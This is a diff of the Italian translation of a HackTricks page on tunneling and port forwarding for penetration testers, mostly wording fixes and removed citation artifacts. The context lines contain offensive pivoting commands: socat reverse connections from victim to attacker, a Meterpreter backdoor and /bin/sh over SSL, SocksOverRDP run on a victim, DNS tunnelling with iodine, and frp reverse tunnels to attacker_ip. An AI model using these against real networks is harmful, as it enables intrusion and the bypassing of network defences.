@@ -1,11 +1,11 @@
-# Tunneling and Port Forwarding
+# Tunneling e Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Suggerimento Nmap
 
 > [!WARNING]
-> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **TCP scans** (`-sT`) affinché questo funzioni.
+> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) affinché questo funzioni.
 
 ## **Bash**
 
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Porta locale --> Host compromesso (SSH) --> Terza_box:Port
+Porta locale --> Host compromesso (SSH) --> Terza_cassa:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sicurezza – Attacco Terrapin (CVE-2023-48795)**
-> L'attacco di downgrade Terrapin del 2023 può consentire a un attaccante man-in-the-middle di manomettere l'inizializzazione SSH e iniettare dati in **qualsiasi canale inoltrato** ( `-L`, `-R`, `-D` ). Assicurati che sia il client che il server siano aggiornati (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o disabilita esplicitamente gli algoritmi vulnerabili `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` in `sshd_config`/`ssh_config` prima di fare affidamento sui tunnel SSH. citeturn4search0
+> L'attacco di downgrade Terrapin del 2023 può consentire a un attaccante man-in-the-middle di manomettere l'inizializzazione SSH e iniettare dati in **qualsiasi canale inoltrato** ( `-L`, `-R`, `-D` ). Assicurati che sia il client che il server siano aggiornati (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o disabilita esplicitamente gli algoritmi vulnerabili `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` in `sshd_config`/`ssh_config` prima di fare affidamento sui tunnel SSH.
 
 ## SSHUTTLE
 
 Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
-Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
+Ad esempio, inoltrando tutto il traffico verso 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -231,7 +231,7 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
-### Accedi alle porte locali dell'agente
+### Accesso alle porte locali dell'agente
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
@@ -242,7 +242,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 Tunnel inverso. Il tunnel viene avviato dalla vittima.\
-Viene creato un proxy socks4 su 127.0.0.1:1080
+Un proxy socks4 viene creato su 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter tramite SSL Socat
+### Meterpreter attraverso SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -294,7 +294,9 @@ Puoi bypassare un **proxy non autenticato** eseguendo questa riga invece dell'ul
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-### SSL Socat Tunnel
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
+### Tunnel SSL Socat
 
 **/bin/sh console**
 
@@ -314,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Collegare la porta SSH locale (22) alla porta 443 dell'host attaccante
+Collega la porta SSH locale (22) alla porta 443 dell'host attaccante
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -348,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 È necessario avere **accesso RDP al sistema**.\
 Scarica:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzionalità Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzionalità Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti attraverso la connessione RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Nel tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
@@ -358,7 +360,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
 
-**Connettersi** tramite **RDP** e caricare ed eseguire nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
+**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -366,7 +368,7 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare il proxy del traffico attraverso quella porta.**
+Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare da proxy al traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
@@ -385,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autenticandosi contro un proxy, crea un binding di una porta localmente che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
+Autenticandosi contro un proxy, crea un collegamento a una porta locale che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
 Ad esempio, inoltra la porta 443.
 ```
 Username Alice
@@ -407,7 +409,7 @@ Un reverse proxy creato da Microsoft. Puoi trovarlo qui: [https://github.com/mic
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare i dati tra di essi utilizzando query DNS.
+È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare dati tra di essi utilizzando query DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -572,11 +574,11 @@ Inizia il connettore:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL in ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile. citeturn1search0
+Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL in ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) è un reverse-proxy in Go attivamente mantenuto che supporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partire da **v0.53.0 (Maggio 2024)** può fungere da **SSH Tunnel Gateway**, quindi un host di destinazione può avviare un tunnel inverso utilizzando solo il client OpenSSH di base – nessun binario extra richiesto.
+[`frp`](https://github.com/fatedier/frp) è un reverse-proxy Go attivamente mantenuto che supporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partire da **v0.53.0 (Maggio 2024)** può fungere da **SSH Tunnel Gateway**, quindi un host di destinazione può avviare un tunnel inverso utilizzando solo il client OpenSSH di base – nessun binario extra richiesto.
 
 ### Tunnel TCP inverso classico
 ```bash
@@ -606,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza implementare alcun strumento aggiuntivo – ideale per il pivoting living-off-the-land. citeturn2search1
+Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza implementare alcun strumento aggiuntivo – ideale per il pivoting living-off-the-land.
 
 ## Altri strumenti da controllare
 
